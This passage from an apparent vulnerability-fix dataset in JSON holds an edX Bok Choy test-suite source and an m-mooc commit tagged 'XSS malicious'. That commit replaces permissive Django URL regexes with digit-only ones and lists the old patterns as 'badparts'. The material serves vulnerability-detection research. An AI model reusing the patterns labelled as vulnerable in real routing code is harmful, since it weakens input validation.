self.start_urls.append(\"\\\"http://localhost:8031/auto_auth?{}\\\"\".format(cms_params)) sequence_url=\"/api/courses/v1/blocks/?{}\".format( urlencode({ \"course_id\": self.course_key, \"depth\": \"all\", \"all_blocks\": \"true\", }) ) auto_auth_params.update({'redirect_to': sequence_url}) lms_params=urlencode(auto_auth_params) self.start_urls.append(\"\\\"http://localhost:8003/auto_auth?{}\\\"\".format(lms_params)) def __enter__(self): if self.should_fetch_course: self.get_test_course() super(Pa11yCrawler, self).__enter__() def get_test_course(self): \"\"\" Fetches the test course. \"\"\" self.imports_dir.makedirs_p() zipped_course=self.imports_dir +'demo_course.tar.gz' msg=colorize('green', \"Fetching the test course from github...\") print msg sh( 'wget{tar_gz_file} -O{zipped_course}'.format( tar_gz_file=self.tar_gz_file, zipped_course=zipped_course, ) ) msg=colorize('green', \"Uncompressing the test course...\") print msg sh( 'tar zxf{zipped_course} -C{courses_dir}'.format( zipped_course=zipped_course, courses_dir=self.imports_dir, ) ) def generate_html_reports(self): \"\"\" Runs pa11ycrawler json-to-html \"\"\" cmd_str=( 'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={report_dir}' ).format(report_dir=self.pa11y_report_dir) sh(cmd_str) @property def cmd(self): \"\"\" Runs pa11ycrawler as staff user against the test course. \"\"\" cmd_str=( 'pa11ycrawler run{start_urls} ' '--pa11ycrawler-allowed-domains={allowed_domains} ' '--pa11ycrawler-reports-dir={report_dir} ' '--pa11ycrawler-deny-url-matcher={dont_go_here} ' '--pa11y-reporter=\"{reporter}\" ' '--depth-limit={depth} ' ).format( start_urls=' '.join(self.start_urls), allowed_domains='localhost', report_dir=self.pa11y_report_dir, reporter=\"1.0-json\", dont_go_here=\"logout\", depth=\"6\", ) return cmd_str ",
                    "sourceWithComments": "\"\"\"\nClass used for defining and running Bok Choy acceptance test suite\n\"\"\"\nfrom time import sleep\nfrom urllib import urlencode\n\nfrom common.test.acceptance.fixtures.course import CourseFixture, FixtureError\n\nfrom path import Path as path\nfrom paver.easy import sh, BuildFailure\nfrom pavelib.utils.test.suites.suite import TestSuite\nfrom pavelib.utils.envs import Env\nfrom pavelib.utils.test import bokchoy_utils\nfrom pavelib.utils.test import utils as test_utils\n\nimport os\n\ntry:\n    from pygments.console import colorize\nexcept ImportError:\n    colorize = lambda color, text: text\n\n__test__ = False  # do not collect\n\nDEFAULT_NUM_PROCESSES = 1\nDEFAULT_VERBOSITY = 2\n\n\nclass BokChoyTestSuite(TestSuite):\n    \"\"\"\n    TestSuite for running Bok Choy tests\n    Properties (below is a subset):\n      test_dir - parent directory for tests\n      log_dir - directory for test output\n      report_dir - directory for reports (e.g., coverage) related to test execution\n      xunit_report - directory for xunit-style output (xml)\n      fasttest - when set, skip various set-up tasks (e.g., collectstatic)\n      serversonly - prepare and run the necessary servers, only stopping when interrupted with Ctrl-C\n      testsonly - assume servers are running (as per above) and run tests with no setup or cleaning of environment\n      test_spec - when set, specifies test files, classes, cases, etc. See platform doc.\n      default_store - modulestore to use when running tests (split or draft)\n      num_processes - number of processes or threads to use in tests. Recommendation is that this\n      is less than or equal to the number of available processors.\n      verify_xss - when set, check for XSS vulnerabilities in the page HTML.\n      See nosetest documentation: http://nose.readthedocs.org/en/latest/usage.html\n    \"\"\"\n    def __init__(self, *args, **kwargs):\n        super(BokChoyTestSuite, self).__init__(*args, **kwargs)\n        self.test_dir = Env.BOK_CHOY_DIR / kwargs.get('test_dir', 'tests')\n        self.log_dir = Env.BOK_CHOY_LOG_DIR\n        self.report_dir = kwargs.get('report_dir', Env.BOK_CHOY_REPORT_DIR)\n        self.xunit_report = self.report_dir / \"xunit.xml\"\n        self.cache = Env.BOK_CHOY_CACHE\n        self.fasttest = kwargs.get('fasttest', False)\n        self.serversonly = kwargs.get('serversonly', False)\n        self.testsonly = kwargs.get('testsonly', False)\n        self.test_spec = kwargs.get('test_spec', None)\n        self.default_store = kwargs.get('default_store', None)\n        self.verbosity = kwargs.get('verbosity', DEFAULT_VERBOSITY)\n        self.num_processes = kwargs.get('num_processes', DEFAULT_NUM_PROCESSES)\n        self.verify_xss = kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', False))\n        self.extra_args = kwargs.get('extra_args', '')\n        self.har_dir = self.log_dir / 'hars'\n        self.a11y_file = Env.BOK_CHOY_A11Y_CUSTOM_RULES_FILE\n        self.imports_dir = kwargs.get('imports_dir', None)\n        self.coveragerc = kwargs.get('coveragerc', None)\n        self.save_screenshots = kwargs.get('save_screenshots', False)\n\n    def __enter__(self):\n        super(BokChoyTestSuite, self).__enter__()\n\n        # Ensure that we have a directory to put logs and reports\n        self.log_dir.makedirs_p()\n        self.har_dir.makedirs_p()\n        self.report_dir.makedirs_p()\n        test_utils.clean_reports_dir()      # pylint: disable=no-value-for-parameter\n\n        if not (self.fasttest or self.skip_clean or self.testsonly):\n            test_utils.clean_test_files()\n\n        msg = colorize('green', \"Checking for mongo, memchache, and mysql...\")\n        print msg\n        bokchoy_utils.check_services()\n\n        if not self.testsonly:\n            self.prepare_bokchoy_run()\n        else:\n            # load data in db_fixtures\n            self.load_data()\n\n        msg = colorize('green', \"Confirming servers have started...\")\n        print msg\n        bokchoy_utils.wait_for_test_servers()\n        try:\n            # Create course in order to seed forum data underneath. This is\n            # a workaround for a race condition. The first time a course is created;\n            # role permissions are set up for forums.\n            CourseFixture('foobar_org', '1117', 'seed_forum', 'seed_foo').install()\n            print 'Forums permissions/roles data has been seeded'\n        except FixtureError:\n            # this means it's already been done\n            pass\n\n        if self.serversonly:\n            self.run_servers_continuously()\n\n    def __exit__(self, exc_type, exc_value, traceback):\n        super(BokChoyTestSuite, self).__exit__(exc_type, exc_value, traceback)\n\n        # Using testsonly will leave all fixtures in place (Note: the db will also be dirtier.)\n        if self.testsonly:\n            msg = colorize('green', 'Running in testsonly mode... SKIPPING database cleanup.')\n            print msg\n        else:\n            # Clean up data we created in the databases\n            msg = colorize('green', \"Cleaning up databases...\")\n            print msg\n            sh(\"./manage.py lms --settings bok_choy flush --traceback --noinput\")\n            bokchoy_utils.clear_mongo()\n\n    def verbosity_processes_string(self):\n        \"\"\"\n        Multiprocessing, xunit, color, and verbosity do not work well together. We need to construct\n        the proper combination for use with nosetests.\n        \"\"\"\n        substring = []\n\n        if self.verbosity != DEFAULT_VERBOSITY and self.num_processes != DEFAULT_NUM_PROCESSES:\n            msg = 'Cannot pass in both num_processors and verbosity. Quitting'\n            raise BuildFailure(msg)\n\n        if self.num_processes != 1:\n            # Construct \"multiprocess\" nosetest substring\n            substring = [\n                \"--with-xunitmp --xunitmp-file={}\".format(self.xunit_report),\n                \"--processes={}\".format(self.num_processes),\n                \"--no-color --process-timeout=1200\"\n            ]\n\n        else:\n            substring = [\n                \"--with-xunit\",\n                \"--xunit-file={}\".format(self.xunit_report),\n                \"--verbosity={}\".format(self.verbosity),\n            ]\n\n        return \" \".join(substring)\n\n    def prepare_bokchoy_run(self):\n        \"\"\"\n        Sets up and starts servers for a Bok Choy run. If --fasttest is not\n        specified then static assets are collected\n        \"\"\"\n        sh(\"{}/scripts/reset-test-db.sh\".format(Env.REPO_ROOT))\n\n        if not self.fasttest:\n            self.generate_optimized_static_assets()\n\n        # Clear any test data already in Mongo or MySQLand invalidate\n        # the cache\n        bokchoy_utils.clear_mongo()\n        self.cache.flush_all()\n\n        # load data in db_fixtures\n        self.load_data()\n\n        # load courses if self.imports_dir is set\n        self.load_courses()\n\n        # Ensure the test servers are available\n        msg = colorize('green', \"Confirming servers are running...\")\n        print msg\n        bokchoy_utils.start_servers(self.default_store, self.coveragerc)\n\n    def load_courses(self):\n        \"\"\"\n        Loads courses from self.imports_dir.\n\n        Note: self.imports_dir is the directory that contains the directories\n        that have courses in them. For example, if the course is located in\n        `test_root/courses/test-example-course/`, self.imports_dir should be\n        `test_root/courses/`.\n        \"\"\"\n        msg = colorize('green', \"Importing courses from {}...\".format(self.imports_dir))\n        print msg\n\n        if self.imports_dir:\n            sh(\n                \"DEFAULT_STORE={default_store}\"\n                \" ./manage.py cms --settings=bok_choy import {import_dir}\".format(\n                    default_store=self.default_store,\n                    import_dir=self.imports_dir\n                )\n            )\n\n    def load_data(self):\n        \"\"\"\n        Loads data into database from db_fixtures\n        \"\"\"\n        print 'Loading data from json fixtures in db_fixtures directory'\n        sh(\n            \"DEFAULT_STORE={default_store}\"\n            \" ./manage.py lms --settings bok_choy loaddata --traceback\"\n            \" common/test/db_fixtures/*.json\".format(\n                default_store=self.default_store,\n            )\n        )\n\n    def run_servers_continuously(self):\n        \"\"\"\n        Infinite loop. Servers will continue to run in the current session unless interrupted.\n        \"\"\"\n        print 'Bok-choy servers running. Press Ctrl-C to exit...\\n'\n        print 'Note: pressing Ctrl-C multiple times can corrupt noseid files and system state. Just press it once.\\n'\n\n        while True:\n            try:\n                sleep(10000)\n            except KeyboardInterrupt:\n                print \"Stopping bok-choy servers.\\n\"\n                break\n\n    @property\n    def cmd(self):\n        \"\"\"\n        This method composes the nosetests command to send to the terminal. If nosetests aren't being run,\n         the command returns an empty string.\n        \"\"\"\n        # Default to running all tests if no specific test is specified\n        if not self.test_spec:\n            test_spec = self.test_dir\n        else:\n            test_spec = self.test_dir / self.test_spec\n\n        # Skip any additional commands (such as nosetests) if running in\n        # servers only mode\n        if self.serversonly:\n            return \"\"\n\n        # Construct the nosetests command, specifying where to save\n        # screenshots and XUnit XML reports\n        cmd = [\n            \"DEFAULT_STORE={}\".format(self.default_store),\n            \"SCREENSHOT_DIR='{}'\".format(self.log_dir),\n            \"BOK_CHOY_HAR_DIR='{}'\".format(self.har_dir),\n            \"BOKCHOY_A11Y_CUSTOM_RULES_FILE='{}'\".format(self.a11y_file),\n            \"SELENIUM_DRIVER_LOG_DIR='{}'\".format(self.log_dir),\n            \"VERIFY_XSS='{}'\".format(self.verify_xss),\n            \"nosetests\",\n            test_spec,\n            \"{}\".format(self.verbosity_processes_string())\n        ]\n        if self.pdb:\n            cmd.append(\"--pdb\")\n        if self.save_screenshots:\n            cmd.append(\"--with-save-baseline\")\n        cmd.append(self.extra_args)\n\n        cmd = (\" \").join(cmd)\n        return cmd\n\n\nclass Pa11yCrawler(BokChoyTestSuite):\n    \"\"\"\n    Sets up test environment with mega-course loaded, and runs pa11ycralwer\n    against it.\n    \"\"\"\n\n    def __init__(self, *args, **kwargs):\n        super(Pa11yCrawler, self).__init__(*args, **kwargs)\n        self.course_key = kwargs.get('course_key')\n        if self.imports_dir:\n            # If imports_dir has been specified, assume the files are\n            # already there -- no need to fetch them from github. This\n            # allows someome to crawl a different course. They are responsible\n            # for putting it, un-archived, in the directory.\n            self.should_fetch_course = False\n        else:\n            # Otherwise, obey `--skip-fetch` command and use the default\n            # test course.  Note that the fetch will also be skipped when\n            # using `--fast`.\n            self.should_fetch_course = kwargs.get('should_fetch_course')\n            self.imports_dir = path('test_root/courses/')\n\n        self.pa11y_report_dir = os.path.join(self.report_dir, 'pa11ycrawler_reports')\n        self.tar_gz_file = \"https://github.com/edx/demo-test-course/archive/master.tar.gz\"\n\n        self.start_urls = []\n        auto_auth_params = {\n            \"redirect\": 'true',\n            \"staff\": 'true',\n            \"course_id\": self.course_key,\n        }\n        cms_params = urlencode(auto_auth_params)\n        self.start_urls.append(\"\\\"http://localhost:8031/auto_auth?{}\\\"\".format(cms_params))\n\n        sequence_url = \"/api/courses/v1/blocks/?{}\".format(\n            urlencode({\n                \"course_id\": self.course_key,\n                \"depth\": \"all\",\n                \"all_blocks\": \"true\",\n            })\n        )\n        auto_auth_params.update({'redirect_to': sequence_url})\n        lms_params = urlencode(auto_auth_params)\n        self.start_urls.append(\"\\\"http://localhost:8003/auto_auth?{}\\\"\".format(lms_params))\n\n    def __enter__(self):\n        if self.should_fetch_course:\n            self.get_test_course()\n        super(Pa11yCrawler, self).__enter__()\n\n    def get_test_course(self):\n        \"\"\"\n        Fetches the test course.\n        \"\"\"\n        self.imports_dir.makedirs_p()\n        zipped_course = self.imports_dir + 'demo_course.tar.gz'\n\n        msg = colorize('green', \"Fetching the test course from github...\")\n        print msg\n\n        sh(\n            'wget {tar_gz_file} -O {zipped_course}'.format(\n                tar_gz_file=self.tar_gz_file,\n                zipped_course=zipped_course,\n            )\n        )\n\n        msg = colorize('green', \"Uncompressing the test course...\")\n        print msg\n\n        sh(\n            'tar zxf {zipped_course} -C {courses_dir}'.format(\n                zipped_course=zipped_course,\n                courses_dir=self.imports_dir,\n            )\n        )\n\n    def generate_html_reports(self):\n        \"\"\"\n        Runs pa11ycrawler json-to-html\n        \"\"\"\n        cmd_str = (\n            'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={report_dir}'\n        ).format(report_dir=self.pa11y_report_dir)\n\n        sh(cmd_str)\n\n    @property\n    def cmd(self):\n        \"\"\"\n        Runs pa11ycrawler as staff user against the test course.\n        \"\"\"\n        cmd_str = (\n            'pa11ycrawler run {start_urls} '\n            '--pa11ycrawler-allowed-domains={allowed_domains} '\n            '--pa11ycrawler-reports-dir={report_dir} '\n            '--pa11ycrawler-deny-url-matcher={dont_go_here} '\n            '--pa11y-reporter=\"{reporter}\" '\n            '--depth-limit={depth} '\n        ).format(\n            start_urls=' '.join(self.start_urls),\n            allowed_domains='localhost',\n            report_dir=self.pa11y_report_dir,\n            reporter=\"1.0-json\",\n            dont_go_here=\"logout\",\n            depth=\"6\",\n        )\n        return cmd_str\n"
                }
            },
            "msg": "Enable VERIFY_XSS checking by default."
        }
    },
    "https://github.com/h4ppyy/m-mooc": {
        "4e4c209ae3deb4c78bcec89c181516af8604b450": {
            "url": "https://api.github.com/repos/h4ppyy/m-mooc/commits/4e4c209ae3deb4c78bcec89c181516af8604b450",
            "html_url": "https://github.com/h4ppyy/m-mooc/commit/4e4c209ae3deb4c78bcec89c181516af8604b450",
            "sha": "4e4c209ae3deb4c78bcec89c181516af8604b450",
            "keyword": "XSS malicious",
            "diff": "diff --git a/lms/urls.py b/lms/urls.py\nindex 776a518599..fe9882b180 100644\n--- a/lms/urls.py\n+++ b/lms/urls.py\n@@ -223,27 +223,27 @@\n             'courseware.views.course_info', name=\"info\"),\n         url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',\n             'courseware.views.syllabus', name=\"syllabus\"),   # TODO arjun remove when custom tabs in place, see courseware/courses.py\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/$',\n             'staticbook.views.index', name=\"book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/(?P<page>\\d+)$',\n             'staticbook.views.index'),\n         url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book-shifted/(?P<page>[^/]*)$',\n             'staticbook.views.index_shifted'),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/$',\n+            'staticbook.views.pdf_index', name=\"pdf_book\"),\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/(?P<page>\\d+)$',\n             'staticbook.views.pdf_index', name=\"pdf_book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n-            'staticbook.views.pdf_index'),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n-            'staticbook.views.pdf_index'),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',\n-            'staticbook.views.pdf_index'),\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',\n+            'staticbook.views.pdf_index', name=\"pdf_book\"),\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/(?P<page>\\d+)$',\n+            'staticbook.views.pdf_index', name=\"pdf_book\"),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/$',\n+            'staticbook.views.html_index', name=\"html_book\"),\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',\n             'staticbook.views.html_index', name=\"html_book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n-            'staticbook.views.html_index'),\n \n         url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',\n             'courseware.views.index', name=\"courseware\"),\n",
            "message": "",
            "files": {
                "/lms/urls.py": {
                    "changes": [
                        {
                            "diff": "\n             'courseware.views.course_info', name=\"info\"),\n         url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',\n             'courseware.views.syllabus', name=\"syllabus\"),   # TODO arjun remove when custom tabs in place, see courseware/courses.py\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/$',\n             'staticbook.views.index', name=\"book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/(?P<page>\\d+)$',\n             'staticbook.views.index'),\n         url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book-shifted/(?P<page>[^/]*)$',\n             'staticbook.views.index_shifted'),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/$',\n+            'staticbook.views.pdf_index', name=\"pdf_book\"),\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/(?P<page>\\d+)$',\n             'staticbook.views.pdf_index', name=\"pdf_book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n-            'staticbook.views.pdf_index'),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n-            'staticbook.views.pdf_index'),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',\n-            'staticbook.views.pdf_index'),\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',\n+            'staticbook.views.pdf_index', name=\"pdf_book\"),\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/(?P<page>\\d+)$',\n+            'staticbook.views.pdf_index', name=\"pdf_book\"),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/$',\n+            'staticbook.views.html_index', name=\"html_book\"),\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',\n             'staticbook.views.html_index', name=\"html_book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n-            'staticbook.views.html_index'),\n \n         url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',\n             'courseware.views.index', name=\"courseware\"),\n",
                            "add": 12,
                            "remove": 12,
                            "filename": "/lms/urls.py",
                            "badparts": [
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',",
                                "            'staticbook.views.pdf_index'),",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',",
                                "            'staticbook.views.pdf_index'),",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',",
                                "            'staticbook.views.pdf_index'),",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',",
                                "            'staticbook.views.html_index'),"
                            ],
                            "goodparts": [
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/$',",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/(?P<page>\\d+)$',",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/$',",
                                "            'staticbook.views.pdf_index', name=\"pdf_book\"),",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/(?P<page>\\d+)$',",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',",
                                "            'staticbook.views.pdf_index', name=\"pdf_book\"),",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/(?P<page>\\d+)$',",
                                "            'staticbook.views.pdf_index', name=\"pdf_book\"),",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/$',",
                                "            'staticbook.views.html_index', name=\"html_book\"),",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',"
                            ]
                        }
                    ],
                    "source": "\nfrom django.conf import settings from django.conf.urls import patterns, include, url from django.contrib import admin from django.conf.urls.static import static from. import one_time_startup import django.contrib.auth.views if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): admin.autodiscover() urlpatterns=('', url(r'^update_certificate$', 'certificates.views.update_certificate'), url(r'^$', 'branding.views.index', name=\"root\"), url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard\"), url(r'^login$', 'student.views.signin_user', name=\"signin_user\"), url(r'^register$', 'student.views.register_user', name=\"register_user\"), url(r'^admin_dashboard$', 'dashboard.views.dashboard'), url(r'^change_email$', 'student.views.change_email_request', name=\"change_email\"), url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'), url(r'^change_name$', 'student.views.change_name_request', name=\"change_name\"), url(r'^accept_name_change$', 'student.views.accept_name_change'), url(r'^reject_name_change$', 'student.views.reject_name_change'), url(r'^pending_name_changes$', 'student.views.pending_name_changes'), url(r'^event$', 'track.views.user_track'), url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'), url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"), url(r'^login_ajax$', 'student.views.login_user', name=\"login\"), url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'), url(r'^logout$', 'student.views.logout_user', name='logout'), url(r'^create_account$', 'student.views.create_account'), url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=\"activate\"), url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=\"begin_exam_registration\"), url(r'^create_exam_registration$', 'student.views.create_exam_registration'), url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'), url(r'^password_change/$', django.contrib.auth.views.password_change, name='auth_password_change'), url(r'^password_change_done/$', django.contrib.auth.views.password_change_done, name='auth_password_change_done'), url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$', 'student.views.password_reset_confirm_wrapper', name='auth_password_reset_confirm'), url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete, name='auth_password_reset_complete'), url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done, name='auth_password_reset_done'), url(r'^heartbeat$', include('heartbeat.urls')), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'WellesleyX'}), url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'McGillX'}), url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'TorontoX'}), url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'RiceX'}), url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'ANUx'}), url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'EPFLx'}), url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile', name=\"university_profile\"), ) urlpatterns +=( url(r'^404$', 'static_template_view.views.render', {'template': '404.html'}, name=\"404\"), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^jobs$', 'static_template_view.views.render', {'template': 'jobs.html'}, name=\"jobs\"), url(r'^press$', 'student.views.press', name=\"press\"), url(r'^media-kit$', 'static_template_view.views.render', {'template': 'media-kit.html'}, name=\"media-kit\"), url(r'^faq$', 'static_template_view.views.render', {'template': 'faq.html'}, name=\"faq_edx\"), url(r'^help$', 'static_template_view.views.render', {'template': 'help.html'}, name=\"help_edx\"), url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'), (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to',{'url': '/static/images/favicon.ico'}), url(r'^submit_feedback$', 'util.views.submit_feedback'), ) for key, value in settings.MKTG_URL_LINK_MAP.items(): if value is None: continue if key==\"ROOT\" or key==\"COURSES\" or key==\"FAQ\": continue template=\"%s.html\" % key.lower() if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: template=\"theme-\" +template urlpatterns +=(url(r'^%s' % key.lower(), 'static_template_view.views.render', {'template': template}, name=value),) if settings.PERFSTATS: urlpatterns +=(url(r'^reprofile$', 'perfstats.views.end_profile'),) if settings.WIKI_ENABLED: from wiki.urls import get_pattern as wiki_pattern from django_notify.urls import get_pattern as notify_pattern urlpatterns +=( url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'), url(r'^wiki/', include(wiki_pattern())), url(r'^notify/', include(notify_pattern())), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$', 'course_wiki.views.course_wiki_redirect', name=\"course_wiki\"), url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())), ) if settings.COURSEWARE_ENABLED: urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$', 'courseware.views.jump_to', name=\"jump_to\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.modx_dispatch', name='modx_dispatch'), url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.xqueue_callback', name='xqueue_callback'), url(r'^change_setting$', 'student.views.change_setting', name='change_setting'), url(r'^calculate$', 'util.views.calculate'), url(r'^courses/?$', 